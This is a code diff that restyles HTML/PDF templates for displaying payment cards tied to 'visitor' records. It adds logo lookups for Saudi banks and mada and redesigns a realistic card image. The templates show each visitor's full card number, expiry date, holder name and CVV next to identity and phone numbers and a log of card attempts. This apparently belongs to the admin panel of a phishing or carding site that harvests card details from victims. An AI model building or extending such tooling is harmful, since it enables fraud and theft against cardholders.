@@ -27,6 +27,21 @@ function escapeHtml(raw: string): string {
     .replace(/\n/g, "<br />");
 }
 
+function getBankLogoUrlForPdf(bankName: string): string | null {
+  const n = (bankName || "").toLowerCase();
+  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national")) return "/logo-snb.png";
+  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png";
+  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg";
+  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png";
+  return null;
+}
+
+function getNetworkLogoUrlForPdf(cardType: string): string | null {
+  const t = (cardType || "").toLowerCase();
+  if (t.includes("mada")) return "/logo-mada.png";
+  return null;
+}
+
 function formatDateTime(value: any): string {
   if (!value) return "";
 
@@ -646,18 +661,23 @@ function buildCardPdfHtml(
   const identityNumber = val(visitor.identityNumber);
   const phoneNumber = val(visitor.phoneNumber);
 
+  const cardLevel = val(visitor.cardLevel || visitor.bankInfo?.level);
+
   const formatCardNumber = (num: string) => {
     const clean = num.replace(/\s/g, "");
     return clean.match(/.{1,4}/g)?.join("  ") || num;
   };
 
-  const cardNetworkLogo = (type: string) => {
+  const bankLogoUrlPdf = getBankLogoUrlForPdf(bankName);
+
+  const cardNetworkBadge = (type: string) => {
     const t = type.toLowerCase();
-    if (t.includes("visa")) return `<span style="font-size:22px;font-weight:900;font-style:italic;color:#fff;font-family:Arial,sans-serif;letter-spacing:-1px;">VISA</span>`;
-    if (t.includes("master")) return `<span style="font-size:18px;font-weight:900;color:#fff;font-family:Arial,sans-serif;">●● mastercard</span>`;
-    if (t.includes("mada")) return `<span style="font-size:18px;font-weight:900;color:#fff;font-family:Arial,sans-serif;">mada</span>`;
-    if (t.includes("amex") || t.includes("american")) return `<span style="font-size:14px;font-weight:900;color:#fff;font-family:Arial,sans-serif;">AMEX</span>`;
-    return `<span style="font-size:13px;font-weight:900;color:#fff;">${escapeHtml(type)}</span>`;
+    const nLogoUrl = getNetworkLogoUrlForPdf(type);
+    if (nLogoUrl) return `<img src="${nLogoUrl}" alt="${escapeHtml(type)}" style="height:28px;max-width:70px;object-fit:contain;" crossorigin="anonymous" />`;
+    if (t.includes("visa")) return `<span style="font-size:22px;font-weight:900;font-style:italic;color:#1a1f71;font-family:Arial;">VISA</span>`;
+    if (t.includes("master")) return `<span style="font-size:14px;font-weight:900;font-family:Arial;"><span style="color:#eb001b;">master</span><span style="color:#f79e1b;">card</span></span>`;
+    if (t.includes("amex") || t.includes("american")) return `<span style="font-size:14px;font-weight:900;color:#006FCF;font-family:Arial;">AMEX</span>`;
+    return `<span style="font-size:13px;font-weight:800;color:#333;">${escapeHtml(type)}</span>`;
   };
 
   const statusLabel = (status: string | undefined) => {
@@ -690,14 +710,6 @@ function buildCardPdfHtml(
       </tr>`;
   }).join("");
 
-  const gradientBg = cardType?.toLowerCase().includes("mada")
-    ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
-    : cardType?.toLowerCase().includes("visa")
-    ? "linear-gradient(135deg, #1D4ED8 0%, #1e3a8a 50%, #172554 100%)"
-    : cardType?.toLowerCase().includes("master")
-    ? "linear-gradient(135deg, #7c3aed 0%, #4c1d95 50%, #2e1065 100%)"
-    : "linear-gradient(135deg, #134e4a 0%, #0f766e 50%, #0d9488 100%)";
-
   return `
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <div id="card-pdf-content" style="font-family:'Cairo',Arial,sans-serif;direction:rtl;text-align:right;width:760px;margin:0 auto;padding:0;color:#0F172A;background:#fff;line-height:1.6;-webkit-print-color-adjust:exact;print-color-adjust:exact;">
@@ -721,29 +733,43 @@ function buildCardPdfHtml(
 
       <!-- Visual Card -->
       <div style="padding:20px 28px 10px;">
-        <div style="background:${gradientBg};border-radius:16px;padding:24px 28px;width:360px;min-height:200px;position:relative;box-shadow:0 20px 60px rgba(0,0,0,0.3);margin-bottom:4px;">
-          <!-- Chip -->
-          <div style="width:38px;height:28px;background:linear-gradient(135deg,#e2b96e,#c9943c);border-radius:5px;margin-bottom:18px;box-shadow:0 2px 6px rgba(0,0,0,0.3);"></div>
-          <!-- Card Number -->
-          <div style="font-size:19px;font-weight:700;color:#fff;letter-spacing:3px;font-family:'Courier New',monospace;margin-bottom:16px;text-shadow:0 1px 4px rgba(0,0,0,0.4);">
-            ${escapeHtml(cardNumber ? formatCardNumber(cardNumber) : "•••• •••• •••• ••••")}
+        <div style="background:linear-gradient(135deg,#e8f5ee 0%,#ddf0e6 35%,#cce8d8 65%,#e2f0e8 100%);border-radius:18px;padding:22px 26px 18px;width:420px;box-shadow:0 8px 32px rgba(0,100,50,0.13),0 2px 8px rgba(0,0,0,0.07);box-sizing:border-box;position:relative;overflow:hidden;">
+          <!-- Sheen -->
+          <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:18px;background:linear-gradient(135deg,rgba(255,255,255,0.45) 0%,transparent 55%);pointer-events:none;"></div>
+          <!-- Top row: bank logo/name + SAR badge -->
+          <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:20px;">
+            ${bankLogoUrlPdf
+              ? `<img src="${bankLogoUrlPdf}" alt="${escapeHtml(bankName)}" style="height:36px;max-width:150px;object-fit:contain;" crossorigin="anonymous" />`
+              : `<div style="font-size:18px;font-weight:900;color:#1a5c35;font-family:Arial,sans-serif;direction:ltr;">${escapeHtml(bankName || "Bank")}</div>`
+            }
+            <div style="border:1.5px solid #444;border-radius:8px;padding:3px 12px;font-size:13px;font-weight:700;color:#222;font-family:Arial;background:rgba(255,255,255,0.5);">SAR</div>
           </div>
-          <!-- Bottom row -->
-          <div style="display:flex;justify-content:space-between;align-items:flex-end;">
-            <div>
-              <div style="font-size:9px;color:rgba(255,255,255,0.6);text-transform:uppercase;letter-spacing:1px;">Card Holder</div>
-              <div style="font-size:13px;font-weight:700;color:#fff;margin-top:2px;">${escapeHtml(cardHolderName || "—")}</div>
+          <!-- Card Number + Expiry -->
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+            <div style="font-size:21px;font-weight:500;color:#111;letter-spacing:2px;font-family:'Courier New',monospace;direction:ltr;">
+              ${escapeHtml(cardNumber ? formatCardNumber(cardNumber) : "•••• •••• •••• ••••")}
             </div>
-            <div style="text-align:left;">
-              <div style="font-size:9px;color:rgba(255,255,255,0.6);text-transform:uppercase;letter-spacing:1px;">Expires</div>
-              <div style="font-size:13px;font-weight:700;color:#fff;margin-top:2px;font-family:'Courier New',monospace;">${escapeHtml(expiryDate || "MM/YY")}</div>
+            <div style="font-size:21px;font-weight:500;color:#111;font-family:'Courier New',monospace;direction:ltr;white-space:nowrap;padding-right:4px;">
+              ${escapeHtml(expiryDate || "MM/YY")}
             </div>
-            <div>${cardType ? cardNetworkLogo(cardType) : ""}</div>
           </div>
-          <!-- Sheen overlay -->
-          <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:16px;background:linear-gradient(135deg,rgba(255,255,255,0.12) 0%,transparent 50%,rgba(0,0,0,0.1) 100%);pointer-events:none;"></div>
+          <!-- Holder Name + CVV -->
+          <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:16px;">
+            <div style="font-size:15px;color:#222;font-weight:500;font-family:Arial;direction:ltr;">${escapeHtml(cardHolderName || "—")}</div>
+            <div style="text-align:right;">
+              <div style="font-size:10px;color:#888;letter-spacing:1px;font-family:Arial;margin-bottom:2px;">CVV</div>
+              <div style="font-size:18px;font-weight:600;color:#111;font-family:'Courier New',monospace;direction:ltr;">${escapeHtml(cvv || "—")}</div>
+            </div>
+          </div>
+          <!-- Bottom row: flag + card type + network -->
+          <div style="display:flex;justify-content:space-between;align-items:center;">
+            <span style="font-size:20px;">🇸🇦</span>
+            <div style="display:flex;align-items:center;gap:10px;">
+              ${(cardLevel || cardType) ? `<span style="font-size:11px;font-weight:700;color:#333;font-family:Arial;letter-spacing:0.5px;">${escapeHtml((cardLevel ? "DEBIT · " + cardLevel.toUpperCase() : cardType?.toUpperCase()) || "")}</span>` : ""}
+              ${cardType ? cardNetworkBadge(cardType) : ""}
+            </div>
+          </div>
         </div>
-        ${bankName ? `<div style="font-size:11px;color:#64748B;margin-top:6px;margin-right:4px;">🏦 ${escapeHtml(bankName)}${bankCountry ? ` · ${escapeHtml(bankCountry)}` : ""}</div>` : ""}
       </div>
 
       <!-- Card Details Table -->
@@ -925,20 +951,17 @@ function buildAllCardsPageHtml(
     return map[status] || status;
   };
 
-  const gradientBg = cardType?.toLowerCase().includes("mada")
-    ? "linear-gradient(135deg,#1a1a2e,#0f3460)"
-    : cardType?.toLowerCase().includes("visa")
-    ? "linear-gradient(135deg,#1D4ED8,#172554)"
-    : cardType?.toLowerCase().includes("master")
-    ? "linear-gradient(135deg,#7c3aed,#2e1065)"
-    : "linear-gradient(135deg,#134e4a,#0d9488)";
+  const cardLevel = val(visitor.cardLevel || visitor.bankInfo?.level);
+  const bankLogoUrlPdf = getBankLogoUrlForPdf(bankName);
 
-  const cardNetworkText = (type: string) => {
+  const cardNetworkBadge = (type: string) => {
     const t = type.toLowerCase();
-    if (t.includes("visa")) return `<span style="font-size:20px;font-weight:900;font-style:italic;color:#fff;font-family:Arial,sans-serif;letter-spacing:-1px;">VISA</span>`;
-    if (t.includes("master")) return `<span style="font-size:16px;font-weight:900;color:#fff;">mastercard</span>`;
-    if (t.includes("mada")) return `<span style="font-size:16px;font-weight:900;color:#fff;">mada</span>`;
-    return `<span style="font-size:13px;font-weight:900;color:#fff;">${escapeHtml(type)}</span>`;
+    const nLogoUrl = getNetworkLogoUrlForPdf(type);
+    if (nLogoUrl) return `<img src="${nLogoUrl}" alt="${escapeHtml(type)}" style="height:22px;max-width:56px;object-fit:contain;" crossorigin="anonymous" />`;
+    if (t.includes("visa")) return `<span style="font-size:18px;font-weight:900;font-style:italic;color:#1a1f71;font-family:Arial;">VISA</span>`;
+    if (t.includes("master")) return `<span style="font-size:12px;font-weight:900;font-family:Arial;"><span style="color:#eb001b;">master</span><span style="color:#f79e1b;">card</span></span>`;
+    if (t.includes("amex") || t.includes("american")) return `<span style="font-size:12px;font-weight:900;color:#006FCF;font-family:Arial;">AMEX</span>`;
+    return `<span style="font-size:11px;font-weight:800;color:#333;">${escapeHtml(type)}</span>`;
   };
 
   const attemptsRows = allCardHistory.map((entry: any, i: number) => {
@@ -983,25 +1006,43 @@ function buildAllCardsPageHtml(
       <div style="padding:14px 22px 8px;display:flex;gap:20px;align-items:flex-start;">
         <!-- Visual Card -->
         <div style="flex-shrink:0;">
-          <div style="background:${gradientBg};border-radius:14px;padding:18px 22px;width:280px;min-height:160px;position:relative;box-shadow:0 12px 40px rgba(0,0,0,0.25);">
-            <div style="width:30px;height:22px;background:linear-gradient(135deg,#e2b96e,#c9943c);border-radius:4px;margin-bottom:14px;"></div>
-            <div style="font-size:15px;font-weight:700;color:#fff;letter-spacing:2.5px;font-family:'Courier New',monospace;margin-bottom:12px;">
-              ${escapeHtml(cardNumber ? fmt(cardNumber) : "•••• •••• •••• ••••")}
+          <div style="background:linear-gradient(135deg,#e8f5ee 0%,#ddf0e6 35%,#cce8d8 65%,#e2f0e8 100%);border-radius:16px;padding:16px 20px 14px;width:300px;box-shadow:0 6px 24px rgba(0,100,50,0.12),0 2px 6px rgba(0,0,0,0.06);box-sizing:border-box;position:relative;overflow:hidden;">
+            <!-- Sheen -->
+            <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:16px;background:linear-gradient(135deg,rgba(255,255,255,0.4) 0%,transparent 55%);pointer-events:none;"></div>
+            <!-- Top row: bank logo/name + SAR badge -->
+            <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px;">
+              ${bankLogoUrlPdf
+                ? `<img src="${bankLogoUrlPdf}" alt="${escapeHtml(bankName)}" style="height:28px;max-width:120px;object-fit:contain;" crossorigin="anonymous" />`
+                : `<div style="font-size:15px;font-weight:900;color:#1a5c35;font-family:Arial,sans-serif;direction:ltr;">${escapeHtml(bankName || "Bank")}</div>`
+              }
+              <div style="border:1.5px solid #444;border-radius:7px;padding:2px 9px;font-size:11px;font-weight:700;color:#222;font-family:Arial;background:rgba(255,255,255,0.5);">SAR</div>
             </div>
-            <div style="display:flex;justify-content:space-between;align-items:flex-end;">
-              <div>
-                <div style="font-size:8px;color:rgba(255,255,255,0.6);letter-spacing:1px;">CARD HOLDER</div>
-                <div style="font-size:11px;font-weight:700;color:#fff;margin-top:1px;">${escapeHtml(cardHolderName || "—")}</div>
+            <!-- Card Number + Expiry -->
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+              <div style="font-size:15px;font-weight:500;color:#111;letter-spacing:1.5px;font-family:'Courier New',monospace;direction:ltr;">
+                ${escapeHtml(cardNumber ? fmt(cardNumber) : "•••• •••• •••• ••••")}
               </div>
-              <div style="text-align:left;">
-                <div style="font-size:8px;color:rgba(255,255,255,0.6);letter-spacing:1px;">EXPIRES</div>
-                <div style="font-size:11px;font-weight:700;color:#fff;margin-top:1px;font-family:'Courier New',monospace;">${escapeHtml(expiryDate || "MM/YY")}</div>
+              <div style="font-size:15px;font-weight:500;color:#111;font-family:'Courier New',monospace;direction:ltr;white-space:nowrap;padding-right:2px;">
+                ${escapeHtml(expiryDate || "MM/YY")}
               </div>
-              ${cardType ? `<div>${cardNetworkText(cardType)}</div>` : ""}
             </div>
-            <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:14px;background:linear-gradient(135deg,rgba(255,255,255,0.1) 0%,transparent 50%,rgba(0,0,0,0.08) 100%);pointer-events:none;"></div>
+            <!-- Holder + CVV -->
+            <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:12px;">
+              <div style="font-size:12px;color:#222;font-weight:500;font-family:Arial;direction:ltr;">${escapeHtml(cardHolderName || "—")}</div>
+              <div style="text-align:right;">
+                <div style="font-size:9px;color:#888;letter-spacing:1px;font-family:Arial;margin-bottom:1px;">CVV</div>
+                <div style="font-size:14px;font-weight:600;color:#111;font-family:'Courier New',monospace;direction:ltr;">${escapeHtml(cvv || "—")}</div>
+              </div>
+            </div>
+            <!-- Bottom row: flag + card type + network -->
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+              <span style="font-size:16px;">🇸🇦</span>
+              <div style="display:flex;align-items:center;gap:7px;">
+                ${(cardLevel || cardType) ? `<span style="font-size:9px;font-weight:700;color:#333;font-family:Arial;letter-spacing:0.5px;">${escapeHtml((cardLevel ? "DEBIT · " + cardLevel.toUpperCase() : cardType?.toUpperCase()) || "")}</span>` : ""}
+                ${cardType ? cardNetworkBadge(cardType) : ""}
+              </div>
+            </div>
           </div>
-          ${bankName ? `<div style="font-size:10px;color:#64748B;margin-top:5px;margin-right:2px;">🏦 ${escapeHtml(bankName)}${bankCountry ? ` · ${escapeHtml(bankCountry)}` : ""}</div>` : ""}
         </div>
 
         <!-- Details Table -->
